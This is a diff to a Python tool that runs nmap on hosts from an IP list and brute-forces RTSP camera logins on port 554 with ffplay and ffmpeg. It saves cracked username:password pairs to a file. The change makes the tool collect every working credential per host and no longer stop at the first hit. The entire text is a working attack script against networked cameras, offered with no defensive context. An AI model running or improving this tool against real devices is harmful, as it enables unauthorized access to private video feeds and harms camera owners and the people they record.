@@ -21,24 +21,21 @@ def verify_success(ip, username, password):
         result = subprocess.run(["ffmpeg", "-rtsp_transport", "tcp", "-i", rtsp_url, "-t", "5", "-f", "null", "-"],
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=5)
 
-        if "Unauthorized" in result.stderr or "Invalid data found" in result.stderr or "Connection refused" in result.stderr:
+        if any(err in result.stderr for err in ["Unauthorized", "Invalid data found", "Connection refused", "400 Bad Request"]):
             print(f"[-] False positive: {rtsp_url} (Verification failed)")
             return False
-
+        
         print(f"[+] CONFIRMED SUCCESS: {rtsp_url}")
         with open("valid_credentials.txt", "a") as f:
             f.write(f"{ip} {username}:{password}\n")
         return True
     except subprocess.TimeoutExpired:
         print(f"[-] Verification timeout: {rtsp_url}")
-
+    
     return False
 
-def attempt_login(ip, username, password, found_event):
+def attempt_login(ip, username, password):
     """Attempts RTSP login and verifies success."""
-    if found_event.is_set():
-        return  # Stop if success is already found
-
     rtsp_url = f"rtsp://{username}:{password}@{ip}:554/"
     print(f"[*] Trying {rtsp_url}")
 
@@ -46,33 +43,31 @@ def attempt_login(ip, username, password, found_event):
         result = subprocess.run(["ffplay", "-rtsp_transport", "tcp", "-i", rtsp_url, "-t", "7"],
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=5)
 
-        if "401 Unauthorized" in result.stderr:
-            print(f"[-] Failed: {rtsp_url} (Unauthorized)")
-        elif "Invalid data found" in result.stderr or "Connection refused" in result.stderr:
-            print(f"[-] Failed: {rtsp_url} (Invalid data or connection refused)")
-        elif result.stderr.strip() == "" and result.stdout.strip() == "":
-            print(f"[-] Failed: {rtsp_url} (Unknown failure)")
+        if any(err in result.stderr for err in ["401 Unauthorized", "Invalid data found", "Connection refused", "400 Bad Request"]):
+            print(f"[-] Failed: {rtsp_url} (Invalid credentials)")
         else:
             print(f"[+] Possible success: {rtsp_url}")
 
             # Verify credentials before considering success
-            if verify_success(ip, username, password):
-                found_event.set()  # Stop further attempts
-
+            return verify_success(ip, username, password)
+    
     except subprocess.TimeoutExpired:
         print(f"[-] Failed: {rtsp_url} (Timeout)")
+    
+    return False
 
-def brute_force_worker(ip, creds_queue, found_event):
+def brute_force_worker(ip, creds_queue, success_list):
     """Worker function to process the credential queue."""
-    while not creds_queue.empty() and not found_event.is_set():
+    while not creds_queue.empty():
         username, password = creds_queue.get()
-        attempt_login(ip, username, password, found_event)
+        if attempt_login(ip, username, password):
+            success_list.append((ip, username, password))  # Store success credentials
         creds_queue.task_done()
 
 def brute_force_rtsp(ip, creds):
     """Attempts RTSP brute-force login using multiple threads for a given IP."""
     creds_queue = queue.Queue()
-    found_event = threading.Event()
+    success_list = []  # List to store successful logins
 
     # Populate the queue with all username-password combinations
     for cred in creds:
@@ -83,7 +78,7 @@ def brute_force_rtsp(ip, creds):
     threads = []
     num_threads = min(5, len(creds))  # Limit concurrent login attempts
     for _ in range(num_threads):
-        thread = threading.Thread(target=brute_force_worker, args=(ip, creds_queue, found_event))
+        thread = threading.Thread(target=brute_force_worker, args=(ip, creds_queue, success_list))
         thread.start()
         threads.append(thread)
 
@@ -92,9 +87,11 @@ def brute_force_rtsp(ip, creds):
     for thread in threads:
         thread.join()
 
-def worker(ip, creds):
+    return success_list  # Return all successful credentials for this IP
+
+def worker(ip, creds, success_results):
     run_nmap(ip)
-    brute_force_rtsp(ip, creds)
+    success_results[ip] = brute_force_rtsp(ip, creds)
 
 def main(ip_list_file, creds_file):
     if not os.path.exists(ip_list_file):
@@ -109,14 +106,22 @@ def main(ip_list_file, creds_file):
     with open(creds_file, "r") as f:
         creds = [line.strip() for line in f if ":" in line]
 
+    success_results = {}
     threads = []
+    
     for ip in ips:
-        thread = threading.Thread(target=worker, args=(ip, creds))
+        thread = threading.Thread(target=worker, args=(ip, creds, success_results))
         thread.start()
         threads.append(thread)
 
     for thread in threads:
         thread.join()
+
+    # Save all successfully cracked credentials
+    with open("valid_credentials.txt", "a") as f:
+        for ip, success_creds in success_results.items():
+            for username, password in success_creds:
+                f.write(f"{ip} {username}:{password}\n")
 
 if __name__ == "__main__":
     ip_list = "ips.txt"  # List of IPs, one per line
